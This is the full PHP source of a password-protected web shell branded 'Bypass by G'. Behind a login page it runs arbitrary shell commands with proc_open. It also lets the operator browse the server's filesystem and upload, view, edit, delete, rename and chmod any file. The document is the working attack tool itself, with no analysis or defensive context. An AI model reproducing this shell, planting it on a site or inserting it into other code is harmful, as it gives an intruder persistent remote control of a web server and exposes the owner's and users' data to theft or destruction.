 $f = '$2y$10$9vSjn60yywZbLtMBmI1hj.fM1Ffp9Funz7SGMD9wrq1c/CW3oID.G'; if (!isset($_COOKIE['loggedin']) || $_COOKIE['loggedin'] !== $f) { if ($_SERVER['REQUEST_METHOD'] == 'POST') { $w = $_POST['password']; if (password_verify($w, $f)) { setcookie('loggedin', $f, time() + 86400 * 30, "/"); header('Location: ' . $_SERVER['PHP_SELF']); exit; } else { $o = 'Incorrect password'; } } echo '<!DOCTYPE html> <html> <head> <title>Login</title> <style> body { font-family: Arial, sans-serif; background-color: #f8f8f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } .login-container { background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } h1 { margin-bottom: 20px; font-size: 24px; text-align: center; } input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; } input[type="submit"] { width: 100%; padding: 10px; border: none; border-radius: 3px; background-color: #333; color: #fff; cursor: pointer; } input[type="submit"]:hover { background-color: #555; } .error { color: red; margin: 10px 0; text-align: center; } </style> </head> <body> <div class="login-container"> <h1>Login</h1>'; if (isset($o)) { echo '<p class="error">' . $o . '</p>'; } echo '<form method="post" action=""> <input type="password" name="password" placeholder="Password" required> <input type="submit" value="Login"> </form> </div> </body> </html>'; exit; } ?> <!DOCTYPE html> <html> <head> <title>Bypass by G</title> <style> body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f8f8f8; color: #333; } .container { width: 90%; margin: 20px auto; padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); } h1 { font-size: 24px; color: #333; text-align: center; } .command-section, .upload-section, .new-folder-section, .new-file-section { margin-bottom: 20px; } .command-section input[type="text"], .upload-section input[type="file"], .new-folder-section input[type="text"], .new-file-section input[type="text"] { width: 70%; padding: 10px; margin-right: 10px; border: 1px solid #ddd; border-radius: 3px; } .command-section input[type="submit"], .upload-section input[type="submit"], .new-folder-section input[type="submit"], .new-file-section input[type="submit"], .home-file-section input[type="submit"] { padding: 10px 20px; border: 1px solid #333; border-radius: 3px; background-color: #fff; color: #333; cursor: pointer; } .command-section input[type="submit"]:hover, .upload-section input[type="submit"]:hover, .new-folder-section input[type="submit"]:hover, .new-file-section input[type="submit"]:hover, .home-file-section input[type="submit"]:hover { background-color: #f0f0f0; } table { width: 100%; border-collapse: collapse; margin-top: 20px; } th, td { padding: 10px; border: 1px solid #ddd; text-align: left; } th { background-color: #f2f2f2; } tr:nth-child(even) { background-color: #f9f9f9; } tr:hover { background-color: #f1f1f1; } .item-name { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } .directory { color: blue; } .file { color: black; } .size { width: 100px; } .permission { text-align: center; } .breadcrumb { display: flex; align-items: center; margin-bottom: 20px; } .breadcrumb p { margin: 0; } .breadcrumb a { color: #333; text-decoration: none; } .breadcrumb a:hover { text-decoration: underline; } .breadcrumb span { margin: 0 5px; } .breadcrumb .home-file { margin-left: 5px; background-color: #fff; border: 1px solid #333; padding: 5px 10px; border-radius: 3px; } .breadcrumb .home-file input { background-color: #fff; border: none; color: #333; cursor: pointer; } .breadcrumb .home-file input:hover { background-color: #f0f0f0; } </style> <script> document.addEventListener("DOMContentLoaded", function() { if (window.location.search.includes("?d=")) { const url = new URL(window.location); url.searchParams.delete('d'); window.history.replaceState({}, document.title, url.pathname); } }); </script> </head> <body> <div class="container"> <h1>Bypass by G</h1> <div class="command-section"> <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:''; ?>"> <label for="cmd_biasa">Run Command:</label> <input type="text" name="cmd_biasa" id="cmd_biasa" placeholder="Enter command"> <input type="submit" value="Run Command"> </form> </div> <hr> <div class="breadcrumb"> <p>Current Directory: <?php $a=realpath(isset($_POST['current_directory'])?$_POST['current_directory']:(isset($_GET['d'])?$_GET['d']:getcwd()));$p=explode(DIRECTORY_SEPARATOR,trim($a,DIRECTORY_SEPARATOR));$i='/';echo '<a href="?d='.urlencode($i).'">/</a>';foreach($p as $af=>$aa){$i.=$aa.DIRECTORY_SEPARATOR;echo '<a href="?d='.urlencode($i).'">'.$aa.'</a>';if($af<count($p)-1){echo ' / ';}} ?></p> <form class="home-file" method="get"> <input type="hidden" name="d" value="<?php echo getcwd(); ?>"> <input type="submit" value="HOME SHELL"> </form> </div> <div class="upload-section"> <form method="post" enctype="multipart/form-data"> <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($a); ?>"> <input type="file" name="file_to_upload" id="file_to_upload"> <input type="submit" value="Upload File"> </form> </div> <div class="new-folder-section"> <form method="post"> <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($a); ?>"> <input type="text" name="folder_name" placeholder="New Folder Name"> <input type="submit" value="Create Folder"> </form> </div> <div class="new-file-section"> <form method="post"> <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($a); ?>"> <input type="text" name="file_name" placeholder="Create New File"> <input type="submit" value="Create File"> </form> </div> <table> <tr> <th>File Name</th> <th>Type</th> <th>Size</th> <th>Permissions</th> <th>Owner</th> <th>Options</th> </tr> <?php if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['file_to_upload'])){$a=realpath($_POST['current_directory']);$u=$a.'/'.basename($_FILES['file_to_upload']['name']);move_uploaded_file($_FILES['file_to_upload']['tmp_name'],$u);}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['folder_name'])){$a=realpath($_POST['current_directory']);$y=$a.'/'.$_POST['folder_name'];mkdir($y);}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['file_name'])){$a=realpath($_POST['current_directory']);$z=$a.'/'.$_POST['file_name'];file_put_contents($z,'');}if(isset($_POST['cmd_biasa'])){$l=$_POST['cmd_biasa'];$s=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$g=proc_open($l,$s,$d);if(is_resource($g)){$x=stream_get_contents($d[1]);$k=stream_get_contents($d[2]);fclose($d[1]);fclose($d[2]);proc_close($g);if(!empty($k)){echo '<hr><p>Error: </p><textarea class="result-box">'.htmlspecialchars($k).'</textarea>';}else{echo '<hr><p>Result: </p><textarea class="result-box">'.htmlspecialchars($x).'</textarea>';}}else{echo 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';}}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['view_file'])){$a=realpath($_POST['current_directory']);$v=$a.'/'.$_POST['view_file'];echo '<pre>'.htmlspecialchars(file_get_contents($v)).'</pre>';}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['edit_file'])){$a=realpath($_POST['current_directory']);$j=$a.'/'.$_POST['edit_file'];if(isset($_POST['file_content'])){file_put_contents($j,$_POST['file_content']);}else{echo '<form method="post"> <input type="hidden" name="current_directory" value="'.htmlspecialchars($a).'"> <input type="hidden" name="edit_file" value="'.htmlspecialchars($_POST['edit_file']).'"> <textarea name="file_content">'.htmlspecialchars(file_get_contents($j)).'</textarea> <input type="submit" value="Save"> </form>';}}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['delete_file'])){$a=realpath($_POST['current_directory']);$e=$a.'/'.$_POST['delete_file'];if(is_dir($e)){rmdir($e);}else{unlink($e);}}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['rename_file'])){$a=realpath($_POST['current_directory']);$m=$a.'/'.$_POST['rename_file'];$t=$a.'/'.$_POST['new_name'];rename($m,$t);}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['chmod_file'])){$a=realpath($_POST['current_directory']);$r=$a.'/'.$_POST['chmod_file'];$q=octdec($_POST['new_permissions']);chmod($r,$q);}$ae=scandir($a);foreach($ae as $b){if($b=='.'||$b=='..'){continue;}$c=$a.'/'.$b;$h=is_dir($c);$ab=$h?'-':filesize($c).' bytes';$ac=substr(sprintf('%o',fileperms($c)),-4);$n=posix_getpwuid(fileowner($c));$ad=$n['name'];echo "<tr>\n <td class='item-name ".($h?'directory':'file')."'><a href='".($h?'?d='.urlencode($c):'#')."'>".htmlspecialchars($b)."</a></td>\n <td>".($h?'Directory':'File')."</td>\n <td class='size'>".$ab."</td>\n <td class='permission'>".$ac."</td>\n <td class='owner'>".$ad."</td>\n <td>\n <form style='display:inline;' method='post' action=''>\n <input type='hidden' name='current_directory' value='".htmlspecialchars($a)."'>\n <input type='hidden' name='view_file' value='".htmlspecialchars($b)."'>\n <input type='submit' value='View'>\n </form>\n <form style='display:inline;' method='post' action=''>\n <input type='hidden' name='current_directory' value='".htmlspecialchars($a)."'>\n <input type='hidden' name='edit_file' value='".htmlspecialchars($b)."'>\n <input type='submit' value='Edit'>\n </form>\n <form style='display:inline;' method='post' action=''>\n <input type='hidden' name='current_directory' value='".htmlspecialchars($a)."'>\n <input type='hidden' name='delete_file' value='".htmlspecialchars($b)."'>\n <input type='submit' value='Delete'>\n </form>\n <form style='display:inline;' method='post' action=''>\n <input type='hidden' name='current_directory' value='".htmlspecialchars($a)."'>\n <input type='hidden' name='rename_file' value='".htmlspecialchars($b)."'>\n <input type='text' name='new_name' placeholder='Rename'>\n <input type='submit' value='Rename'>\n </form>\n <form style='display:inline;' method='post' action=''>\n <input type='hidden' name='current_directory' value='".htmlspecialchars($a)."'>\n <input type='hidden' name='chmod_file' value='".htmlspecialchars($b)."'>\n <input type='text' name='new_permissions' placeholder='Chmod'>\n <input type='submit' value='Chmod'>\n </form>\n </tr>";} ?> </table> </div> </body> </html> <?php 
 ◀